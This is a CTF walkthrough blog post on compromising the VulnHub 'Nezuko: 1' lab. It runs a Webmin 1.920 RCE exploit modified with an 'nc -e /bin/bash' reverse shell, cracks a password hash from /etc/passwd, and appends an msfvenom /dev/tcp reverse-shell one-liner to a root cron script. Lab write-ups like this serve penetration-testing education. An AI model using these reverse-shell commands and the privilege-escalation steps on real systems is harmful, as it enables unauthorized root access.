<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Nezuko: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/nezuko-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-08-24T11:16:27+00:00">August 24, 2019</time><time class="updated" datetime="2025-06-10T20:11:17+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another CTF challenge called “Nezuko: 1”. It is available on Vulnhub for the purpose of Penetration Testing practices. This lab is not that difficult if we have the proper basic knowledge of cracking the labs. This credit of making this lab goes to <a style="color: #000000;" href="https://twitter.com/@yunaranyancat">yunaranyancat</a>. Let’s start and learn how to successfully breach it.</span></p>
<p><span style="color: #000000;">Level: Intermediate</span></p>
<p><span style="color: #000000;">Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/nezuko-1,352/">link</a></strong></span>.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Browsing Webmin Service</span></li>
<li><span style="color: #000000;">Enumerating Webmin Service</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Exploiting Remote Code Execution Vulnerability</span></li>
<li><span style="color: #000000;">Get Shell</span></li>
<li><span style="color: #000000;">Enumerate for Flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Readable /etc/passwd file</span></li>
<li><span style="color: #000000;">Cracking hash using John The Ripper</span></li>
<li><span style="color: #000000;">Creating reverse bash script using msfvenom</span></li>
<li><span style="color: #000000;">Editing script scheduled to autorun</span></li>
<li><span style="color: #000000;">Get Escalated Shell</span></li>
<li><span style="color: #000000;">Enumerate for flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Capture the flag</strong></span></p>
<h3><span style="color: #000000;"><strong>Walkthrough </strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">We will be running this lab in a Virtual Machine Player or Virtual Box.  After running the lab, we used the netdiscover command to check the IP Address of the lab.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;">This was found out to be 192.168.1.105.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Tv-pywLjqKI/XWEZC_rI4rI/AAAAAAAAgOY/duoFPOiMMI0G85v-iEv3DqD9bvhQ5NczwCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now we will run an aggressive scan using nmap for proceed further.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.105</pre>
<p><span style="color: #000000;">From its result, we found ports 22(SSH), 80(HTTP), 13337(MiniServ) were open.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jdUu-gyl0y8/XWEZEtQeTVI/AAAAAAAAgOs/W5O2mP4mkpEdmOKSn_fWtecg4WJ6SXyBwCLcBGAs/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">For more detail, we will be needing to start enumeration against the host machine. Therefore, we will navigate to a web browser for exploring HTTP service.</span></p>
<p><span style="color: #000000;"> We obtained an image of Nezuko anime character as shown in the given below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-owx1ygexC6Y/XWEZE3O3NXI/AAAAAAAAgOw/VmbCs8p0E8I17gTqXVA1RCINXkaq0RhegCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">This webpage turned out to be a waste of time as we were not being able to extract anything from here. It’s time to explore other ports. Next one in our port scan was 13337. So we browsed to that port and it gave us the login panel of Webmin as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RmRvH8K5wiE/XWEZEx-QC9I/AAAAAAAAgO0/D57LAlPnhQ8ffepa5BTubyCj_yANHWhCQCLcBGAs/s1600/4.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploiting</strong></span></h3>
<p><span style="color: #000000;">As we were not able to get out hands on credentials in our initial enumeration. We will have to figure out a different way to get through this Authorization Login Panel of Webmin. In our initial port scan, we figured out that our target machine is running the Webmin Version 1.920. So we used the searchsploit to search for any available exploits.</span></p>
<pre class="lang:default decode:true">searchsploit Webmin 1.920</pre>
<p><span style="color: #000000;">This gave us the Remote Code Execution(RCE) Exploit. Now let’s download this exploit script using the -m parameter of the searchsploit command.</span></p>
<pre class="lang:default decode:true">searchsploit -m 47293</pre>
<p><span style="color: #000000;">Now let’s read the contents of the exploit as well understand the usage of the exploit.</span></p>
<pre class="lang:default decode:true">cat 47293.sh</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-1bsvMdcshQY/XWEZFt4fFUI/AAAAAAAAgO4/0j5lbeTYs2gVkgpgLSAaQs1cvTGOh9yHwCLcBGAs/s1600/5.png"/></strong></span></p>
<p><span style="color: #000000;">We saw that the exploit checks the Vulnerability through the RCE and returns the arguments “Vulnerable “or “Target is not Vulnerable”. But we want to gain a remote shell on target system. So we modified the exploit script to generate a netcat session from the target machine as shown in the image. We renamed the file to “shell.sh” as it is easier to remember than “47293”.</span></p>
<pre class="lang:default decode:true">nano shell.sh
nc -e /bin/bash [Attacker IP] [Port]</pre>
<p><span style="color: #000000;">Here, we have the IP Address of our Attacker Machine (Kali Linux) is 192.168.1.106</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fdNKDPb0uE8/XWEZGKdv4XI/AAAAAAAAgO8/LKdL2lHL_C4qRMq33CqlNCvAIQ9AdZqyACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now, let’s execute the shell script with the target IP address and Port as parameters. But before executing this shell script, we will initiate a netcat listener to receive the reverse shell.</span></p>
<pre class="lang:default decode:true">sh shell.sh https://192.168.1.105:13337</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zjJ6RhS-ZW8/XWEZGH-HbaI/AAAAAAAAgPA/GAVm9t35djUlQUo3bG-28l0z7DgjF-NJwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">We started this netcat listener as discussed earlier. And as the shell script was executed we got an improper shell of the target machine. We used the python one-line to convert it into a proper shell.</span></p>
<pre class="lang:default decode:true">nc -lvp 1337
python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">We can see that we have got the shell as the user Nezuko. We enumerated further using the ls command. This gave us that we have a directory named “from_zenitsu” as well as a text file named nezuko.txt. When we further investigated we saw that a message is received every 5 minutes. As the directory is named “from_zenitsu”, we assumed that there must be a user by that name.</span></p>
<pre class="lang:default decode:true">cd
ls
cd from_zenitsu
ls</pre>
<p><span style="color: #000000;">But let’s also open the nezukto.txt file. It is our first flag. Now we will have to escalate privilege on this machine.</span></p>
<pre class="lang:default decode:true">cat nezuko.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-d8yGavwl3y4/XWEZGvboMXI/AAAAAAAAgPE/p3SM0SPEUgEFD9CTA6TJWvSxvTbmZmVOwCLcBGAs/s1600/8.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">We were looking for a user named zenitsu, so we thought to check if the /etc/passwd file is readable or not. It was readable. And we found a user named zenitsu as shown in the given image.</span></p>
<pre class="lang:default decode:true">cat /etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tsYW7xV25J4/XWEZG3oE0GI/AAAAAAAAgPI/KHmMy8byKUE-7m9SIB0gjR0-gyIP324cACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We used John The Ripper to crack the password hash of the user zenitsu. As shown in the image, it is “meowmeow”.</span></p>
<pre class="lang:default decode:true">john hash --show</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qnjP1fgw__Q/XWEZDC_PnGI/AAAAAAAAgOc/iCymfGdwJDEYDIeXJiisvC-5USj-kvAagCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now, as we have the credentials of the user zenitsu, let’s traverse to that user.</span></p>
<pre class="lang:default decode:true">su zenitsu</pre>
<p><span style="color: #000000;">We entered the password “meowmeow” as shown in the image.</span></p>
<pre class="lang:default decode:true">cd
ls
cd to_nezuko
ls –la send_message_to_nezuko.sh</pre>
<p><span style="color: #000000;">Now it’s time to enumerate this user as well. Here, on close inspection, we found a directory named “to_nezuko”. In this directory, we found the script that sends those messages to nezuko. We checked the permission of the script and found out that it runs with elevated privileges.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-b3ztgNq1Zn4/XWEZC5D7lUI/AAAAAAAAgOU/I7DaUFeyGhI_3WkhanJX12wCkcRlOc2VwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now we created a reverse bash shell using the msfvenom, as shown in the given image to get a root shell on the target machine. We choose the format of payload to be Raw. We did this so that we can have the script available to us as shown in the given image.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.106 lport=1234 R</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-J2ojW18d8R4/XWEZD-xXPCI/AAAAAAAAgOg/IJ_YuNUl5cEwLpEQAaBDOGZLwAeK8_iVgCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">We used the echo command as the zenitsu user, to edit the send_message_to_nezuko.sh file. We altered our shell code in the script. Now as we observed earlier, this script gets executed every 5 minutes. So we will wait for it to execute.</span></p>
<pre class="lang:default decode:true">echo "0&lt;&amp;60-;exec 60&lt;&gt;/dev/tcp/192.168.1.106/1234;sh &lt;&amp;60 &gt;&amp;60 2&gt;&amp;60" &gt;&gt; send_message_to_nezuko.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dCcevSOz6Zk/XWEZEJW-6tI/AAAAAAAAgOk/MA8AWdFFz_oZomDMbGcGOP_ZXc3hAUrbwCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">In order to receive the shell, we started a netcat listener on the port that we mentioned while creating the payload. And after waiting for 5 minutes, we have the shell, here we found the root.txt. This was our final flag.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234
id
cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;">This was a good lab that made us understand some important aspects of scheduled tasks between users on the same machine. As well as to exploit a Webmin Panel.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-n1ieJsNM5EM/XWEZENuvYDI/AAAAAAAAgOo/jW-Z8ljb5WcqLGCGFTmvrxZwMC94Quc_QCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact <a style="color: #000000;" href="https://www.linkedin.com/in/pavandeep-singh-6b1074132"><strong>here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
